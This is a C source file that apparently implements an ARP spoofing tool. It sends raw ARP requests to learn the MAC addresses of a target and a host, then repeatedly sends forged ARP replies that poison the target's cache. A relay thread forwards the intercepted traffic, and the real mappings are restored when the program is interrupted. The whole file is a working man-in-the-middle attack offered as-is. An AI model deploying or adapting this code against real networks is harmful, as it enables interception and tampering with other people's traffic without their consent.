#include "protocol.h"
#define TIME_SEC 1

int g_signal_fleg=0;

struct thread_arg
{
    int sock;
    struct in_addr target_ip;
    struct in_addr host_ip;
};
struct relay_thread_arg
{
    uint8_t *mac;
    char *if_name;
};
struct arp_data
{
    uint8_t target_mac[6];
    uint8_t host_mac[6];
};

void *thread_recivarp(void *p);
void *thread_relay(void *p);
void INThandler(int sig);
void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac);

int arp_spoof(char *i_if_name, char *i_target_ip, char *i_host_IP)
{
    int sock, len,result;
    struct sockaddr_ll sll;
    struct nic_info info;
    uint8_t *buffer;
    struct in_addr target_ip, host_ip;
    pthread_t thread_id;
    struct thread_arg thread_arg;
    struct relay_thread_arg r_arg;
    struct arp_data *arp_data;
    char * if_name = i_if_name;
    

    if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
    {
        perror("socket ");
        return -1;
    }

    if(get_info(&info, if_name)<0)
    {
        printf("Interface Name error\n");
        return -1;
    }
    if(!inet_aton(i_target_ip,&target_ip))
    {
        printf("Target IP error\n");
        return -1;
    }
    if(!inet_aton(i_host_IP,&host_ip))
    {
         printf("Host IP error\n");
         return -1;
    }

    thread_arg.sock = sock;
    thread_arg.target_ip.s_addr = target_ip.s_addr;
    thread_arg.host_ip.s_addr = host_ip.s_addr;
    
    pthread_create(&thread_id, NULL, thread_recivarp, &thread_arg);

    memset(&sll, 0, sizeof(sll));
    sll.sll_ifindex = info.ifindex;
    sll.sll_halen = ETH_ALEN; // length of destination mac address
    memset(sll.sll_addr, 0xFF, 6);

    buffer = make_arp_request_packet(info.my_mac, info.addr, target_ip);
    if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
        perror("sendto"); 
        
    buffer = make_arp_request_packet(info.my_mac, info.addr, host_ip);
    if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
        perror("sendto");  

    pthread_join(thread_id, (void **)&arp_data);
    
    if(arp_data == NULL)
        return -1;
    
    r_arg.mac = arp_data->host_mac;
    r_arg.if_name = if_name;
    pthread_create(&thread_id, NULL, thread_relay, &r_arg);

    buffer = make_arp_reply_packet(info.my_mac, host_ip ,arp_data->target_mac ,target_ip);

    signal(SIGINT, INThandler);
    while(1)
    {
        print_packet(&host_ip,info.my_mac,&target_ip,arp_data->target_mac);
        if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
            perror("sendto");
        if(g_signal_fleg)
            break;
        sleep(1);
    }

    buffer = make_arp_reply_packet(arp_data->host_mac ,host_ip ,arp_data->target_mac ,target_ip);
    
    printf("Spoofing Ending...\n");
    for(int i=0; i<3 ; i++)
    {
        print_packet(&host_ip,arp_data->host_mac,&target_ip,arp_data->target_mac);
        if((len = sendto(sock, buffer, ARP_MAX_LEN,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
            perror("sendto");
        sleep(1);
    }
    

    free(arp_data);
    close(sock);
    return 0;
}

void *thread_recivarp(void *p)
{
    struct thread_arg *arg = (struct thread_arg *)p;
    int sock = arg->sock;
    uint8_t buffer[ARP_MAX_LEN];
    struct etherhdr *etherhdr;
    struct arphdr *arphdr;
    struct in_addr target_ip = arg->target_ip;
    struct in_addr host_ip = arg->host_ip;
    struct arp_data *arp_data = (struct arp_data *)malloc(sizeof(struct arp_data));
    int t_fleg=0, h_fleg = 0;
    time_t start = time(NULL);
    time_t endtime = start + TIME_SEC;

    while(start < endtime)
    {
        if(read(sock, buffer, sizeof(buffer))<0)
            perror("read");
        etherhdr = (struct etherhdr *)buffer;
        arphdr = (struct arphdr*)(buffer+sizeof(struct etherhdr));
        
        if(etherhdr->ether_type == htons(0x0806))
        {
            if(arphdr->ar_op == htons(0x0002))
            {
                if(arphdr->ar_sip == target_ip.s_addr)
                {
                    memcpy(arp_data->target_mac,arphdr->ar_sha,6);
                    t_fleg = 1;
                }
                else if(arphdr->ar_sip == host_ip.s_addr)
                {
                    memcpy(arp_data->host_mac,arphdr->ar_sha,6);
                    h_fleg = 1;
                }
            }
        }
        if(t_fleg && h_fleg) return (void*)arp_data;
        start = time(NULL);
    }
    if(t_fleg && !h_fleg)
    {
        printf("<target_ip>is not up\n");
        return NULL;
    }
    else if(h_fleg && !t_fleg)
    {   
        printf("<host_ip> is not up\n");
        return NULL;
    }
    else if(!h_fleg && !t_fleg)
    {
        printf("All ip is not up\n");
        return NULL;
    }
}

void *thread_relay(void *p)
{
    struct relay_thread_arg *r_arg = (struct relay_thread_arg *)p;
    relay(r_arg->mac, r_arg->if_name);
}

void INThandler(int sig)
{
    signal(sig, SIG_IGN);

    g_signal_fleg = 1;
}

void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac)
{
    char h_ip[16], t_ip[16];
    strcpy(h_ip, inet_ntoa(*host_ip));
    strcpy(t_ip, inet_ntoa(*target_ip));

    printf("%s is at %02x:%02x:%02x:%02x:%02x:%02x -> %s[%02x:%02x:%02x:%02x:%02x:%02x]\n",
    h_ip, host_mac[0],host_mac[1],host_mac[2],host_mac[3],host_mac[4],host_mac[5],
    t_ip, target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
}